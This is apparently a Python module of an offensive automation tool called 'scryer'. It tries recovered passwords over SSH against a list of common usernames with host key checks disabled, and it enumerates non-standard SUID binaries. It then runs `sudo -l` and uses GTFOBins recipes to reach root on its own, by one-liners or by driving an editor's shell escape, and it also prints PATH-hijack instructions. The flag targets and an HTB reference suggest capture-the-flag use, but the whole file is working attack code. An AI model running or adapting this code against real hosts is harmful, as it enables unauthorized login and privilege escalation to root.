"""SSH + sudo/GTFOBins privilege escalation (opt-in, --exploit).

When scryer has recovered a credential and SSH is open, it logs in, runs
`sudo -l`, and — for any allowed binary with a known GTFOBins escalation —
prints the exact steps AND attempts to read the root flag automatically:

  * free-arg rules (e.g. `(ALL) /usr/bin/find`) -> a non-interactive one-liner
    reads /root/root.txt as root.
  * fixed-arg editor/pager rules (the classic `sudo vi <file>`) -> best-effort
    keystroke drive of the editor's own shell escape (always with printed steps
    as the reliable fallback).

Needs sshpass + ssh on PATH for password auth; without them it emits the manual
commands. Everything here is active — gated behind --exploit.
"""

from __future__ import annotations

import shutil
import subprocess
from typing import List, Optional, Tuple

from ...core import utils
from ...core.report import HostReport, Finding
from ...data import knowledge, gtfobins

_ROOT_FLAGS = ["/root/root.txt", "/root/flag.txt", "/root/proof.txt"]
_SVC_USERS = ["postgres", "mysql", "www-data", "root", "admin", "ubuntu",
              "administrator", "user", "webadmin", "dev", "service"]
_SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
             "-o", "ConnectTimeout=8", "-o", "PreferredAuthentications=password",
             "-o", "PubkeyAuthentication=no"]


def run(host: HostReport, opts) -> None:
    if not getattr(opts, "exploit", False) or not host.creds:
        return
    if 22 not in {e["port"] for e in host.open_ports}:
        return
    if not (shutil.which("sshpass") and shutil.which("ssh")):
        host.add(Finding(
            title="SSH creds recovered — try them + GTFOBins by hand",
            detail="Install sshpass for scryer to auto-privesc. Manual: ssh "
                   "<user>@<ip>, then `sudo -l`, then GTFOBins the allowed "
                   "binary (see notes/linux-privesc.md).",
            severity="info", category="access", port=22, service="ssh",
            confidence="potential"))
        return

    ip = host.resolved_ip
    users = _candidate_users(host)
    creds = list(dict.fromkeys(host.creds))
    tried = 0
    for pw in creds:
        for user in users:
            tried += 1
            if tried > 40:
                return
            if not _login_ok(ip, user, pw):
                continue
            utils.section(f"SSH PRIVESC {user}@{ip}")
            utils.log("hot", f"SSH login works: {user}:{pw}", indent=1)
            host.add(Finding(
                title=f"SSH access as {user}", detail=f"{user}:{pw}",
                severity="high", category="access", port=22, service="ssh",
                evidence=f"{user}:{pw}"))
            _grab_user_flags(host, ip, user, pw)
            _enum_suid(host, ip, user, pw)
            _privesc(host, ip, user, pw)
            return   # a working login + privesc attempt is enough


# --- login / exec ----------------------------------------------------------
def _ssh(ip: str, user: str, pw: str, command: str, tty: bool = False,
         feed: Optional[str] = None, timeout: int = 30) -> Tuple[int, str]:
    cmd = ["sshpass", "-p", pw, "ssh"] + _SSH_OPTS
    if tty:
        cmd.append("-tt")
    cmd += [f"{user}@{ip}", command]
    try:
        p = subprocess.run(cmd, input=feed, capture_output=True, text=True,
                           timeout=timeout)
        return p.returncode, (p.stdout or "") + (p.stderr or "")
    except Exception as exc:
        return -1, str(exc)


def _login_ok(ip: str, user: str, pw: str) -> bool:
    rc, out = _ssh(ip, user, pw, "id", timeout=15)
    return "uid=" in out


def _candidate_users(host: HostReport) -> List[str]:
    users = list(_SVC_USERS)
    # Usernames scryer already saw (DB creds, email leaks) go first.
    for f in host.findings:
        if f.title.startswith("DB credential") or "SSH access" in f.title:
            m = f.evidence.split(":")[0] if f.evidence else ""
            if m and m not in users:
                users.insert(0, m)
        if "Email/username leak" in f.title:
            import re
            mm = re.search(r"([A-Za-z0-9._-]+)@", f.title)
            if mm and mm.group(1) not in users:
                users.append(mm.group(1))
    # Each recovered plaintext as a username too (user==pass reuse).
    for c in host.creds:
        if c.isalnum() and c not in users:
            users.append(c)
    return list(dict.fromkeys(users))


# --- loot + privesc --------------------------------------------------------
def _grab_user_flags(host: HostReport, ip, user, pw) -> None:
    rc, out = _ssh(ip, user, pw,
                   "cat ~/user.txt ~/flag.txt /home/*/user.txt 2>/dev/null", timeout=15)
    for tok in knowledge.find_flags(out or ""):
        _flag(host, tok, f"{user}@{ip}:~", "USER")


# Standard SUID binaries present on a stock Ubuntu — anything else is notable.
_STD_SUID = {"sudo", "su", "mount", "umount", "passwd", "chsh", "chfn",
             "gpasswd", "newgrp", "pkexec", "fusermount", "fusermount3",
             "ping", "ping6", "dbus-daemon-launch-helper", "ssh-keysign",
             "at", "snap-confine", "vmware-user-suid-wrapper", "polkit-agent-helper-1"}


def _enum_suid(host: HostReport, ip, user, pw) -> None:
    """Enumerate non-standard SUID binaries and the user's group-owned binaries
    — the usual local-root vectors (custom SUID, GTFOBins, PATH hijack)."""
    rc, out = _ssh(ip, user, pw,
                   "find / -perm -4000 -type f 2>/dev/null; echo '---'; "
                   "id; echo '---'; for g in $(id -Gn); do "
                   "find / -group $g -type f 2>/dev/null | grep -vE "
                   "'^/(proc|sys|run)'; done", timeout=30)
    suid_part = out.split("---")[0] if "---" in out else out
    unusual = [b.strip() for b in suid_part.splitlines()
               if b.strip().startswith("/")
               and b.rsplit("/", 1)[-1] not in _STD_SUID]
    if unusual:
        for b in unusual[:8]:
            name = b.rsplit("/", 1)[-1]
            recipe = gtfobins.lookup(name)
            hint = (f" — GTFOBins: {recipe['shell']}" if recipe and recipe.get("shell")
                    else " — check GTFOBins; if it runs another binary by name, "
                         "try a PATH hijack (put a malicious 'cat'/etc. in $PATH).")
            utils.log("hot", f"non-standard SUID: {b}{hint[:60]}", indent=2)
        host.add(Finding(
            title=f"Non-standard SUID binaries ({len(unusual)}) — privesc vector",
            detail="\n".join(unusual[:15]) + "\n\nEach runs as its owner (often "
                   "root). Check GTFOBins; a custom binary that calls another "
                   "command WITHOUT a full path (e.g. `cat`) is a PATH-hijack "
                   "root: write /tmp/cat -> /bin/sh, chmod +x, "
                   "export PATH=/tmp:$PATH, run it. (HTB Oopsie: "
                   "/usr/bin/bugtracker.)  See notes/linux-privesc.md.",
            severity="high", category="access", port=22, service="ssh",
            confidence="potential", evidence="\n".join(unusual)))


def _privesc(host: HostReport, ip, user, pw) -> None:
    rc, out = _ssh(ip, user, pw, f"echo '{pw}' | sudo -S -l 2>/dev/null", timeout=20)
    if "may run the following" not in out and "NOPASSWD" not in out:
        utils.log("dim", "no sudo rights (or password refused)", indent=1)
        host.add(Finding(
            title=f"No sudo escalation for {user}",
            detail="`sudo -l` returned nothing usable. Enumerate further: "
                   "linpeas, SUID (find / -perm -4000), cron, capabilities. "
                   "See notes/linux-privesc.md.", severity="info",
            category="access", port=22, service="ssh"))
        return

    entries = _parse_sudo_l(out)
    if not entries:
        return
    for binary, args, nopasswd in entries:
        name = binary.rsplit("/", 1)[-1]
        recipe = gtfobins.lookup(name)
        if not recipe:
            utils.log("dim", f"sudo {binary} — no GTFOBins recipe on file", indent=2)
            continue
        _emit_steps(host, binary, args, recipe, ip, user, pw)
        if _auto_root(host, ip, user, pw, binary, args, recipe):
            return


def _parse_sudo_l(out: str) -> List[Tuple[str, str, bool]]:
    """Return [(binary_path, args, nopasswd)] from `sudo -l` output."""
    entries = []
    for line in out.splitlines():
        line = line.strip()
        m = None
        import re
        m = re.match(r"\(([^)]*)\)\s*(NOPASSWD:\s*)?(/[^\s,]+)(.*)$", line)
        if m:
            nopass = bool(m.group(2))
            binpath = m.group(3)
            args = m.group(4).strip()
            entries.append((binpath, args, nopass))
    return entries


def _emit_steps(host, binary, args, recipe, ip, user, pw) -> None:
    name = binary.rsplit("/", 1)[-1]
    if recipe.get("interactive"):
        inside = recipe.get("inside", [])
        readc = recipe.get("inside_read", "")
        steps = (f"ssh {user}@{ip}  (pw: {pw})\n"
                 f"sudo {binary} {args}".rstrip() + "\n"
                 f"   then INSIDE {name}, type:  "
                 + "  ".join(inside)
                 + (f"\n   or read the flag in one step:  {readc.format(f='/root/root.txt')}"
                    if readc else "")
                 + "\n   (these go on the editor's ':' line, not the shell)")
    else:
        steps = (f"ssh {user}@{ip}  (pw: {pw})\n{recipe.get('shell', '')}\n"
                 "# spawns a root shell -> cat /root/root.txt")
    utils.log("hot", f"GTFOBins: sudo {name} is exploitable to root", indent=2)
    host.add(Finding(
        title=f"Root via sudo {name} (GTFOBins)",
        detail=steps, severity="critical", category="access", port=22,
        service="ssh", evidence=f"sudo {binary} {args}".strip()))


def _auto_root(host, ip, user, pw, binary, args, recipe) -> bool:
    name = binary.rsplit("/", 1)[-1]
    # Free-arg rule + non-interactive recipe -> read the flag directly as root.
    if recipe.get("freeargs") and not args and recipe.get("auto_read"):
        for path in _ROOT_FLAGS:
            payload = recipe["auto_read"].format(f=path)
            rc, out = _ssh(ip, user, pw,
                           f"echo '{pw}' | sudo -S {binary} {payload} 2>/dev/null",
                           timeout=25)
            for tok in knowledge.find_flags(out or ""):
                _flag(host, tok, f"sudo {name}", "ROOT")
                return True
    # Interactive editor/pager -> best-effort keystroke drive of its shell escape.
    if recipe.get("interactive"):
        return _drive_editor(host, ip, user, pw, binary, args, recipe, name)
    return False


def _drive_editor(host, ip, user, pw, binary, args, recipe, name) -> bool:
    # Cache sudo creds so the editor launch doesn't re-prompt, then feed the
    # editor its own escape + a cat of the flag. Best-effort (needs a pty).
    _ssh(ip, user, pw, f"echo '{pw}' | sudo -S -v 2>/dev/null", timeout=15)
    readc = recipe.get("inside_read")
    for path in _ROOT_FLAGS:
        if readc:
            keys = f"\x1b\x1b{readc.format(f=path)}\r\r:q!\r"
        else:
            inside = recipe.get("inside", [])
            keys = "\x1b\x1b" + "".join(k + "\r" for k in inside) \
                   + f"cat {path}\rexit\r"
        rc, out = _ssh(ip, user, pw, f"sudo {binary} {args}".rstrip(),
                       tty=True, feed=keys, timeout=25)
        for tok in knowledge.find_flags(out or ""):
            _flag(host, tok, f"sudo {name} (editor escape)", "ROOT")
            return True
    utils.log("warn", f"couldn't auto-drive {name} — use the printed steps "
                      "(they're exact)", indent=2)
    return False


def _flag(host, tok, source, kind) -> None:
    color = utils.C.RED if kind == "ROOT" else utils.C.GREEN
    bar = utils.c("╔" + "═" * 56, color, utils.C.BOLD)
    print("\n  " + bar)
    print("  " + utils.c(f"║ {kind} FLAG ({source})", color, utils.C.BOLD))
    print("  " + utils.c(f"║ {tok}", utils.C.YELLOW, utils.C.BOLD))
    print("  " + utils.c("╚" + "═" * 56, color, utils.C.BOLD) + "\n")
    host.add(Finding(
        title=f"{kind} FLAG captured via SSH: {source}", detail=tok,
        severity="critical", category="flag", port=22, service="ssh",
        evidence=f"{source}: {tok}"))
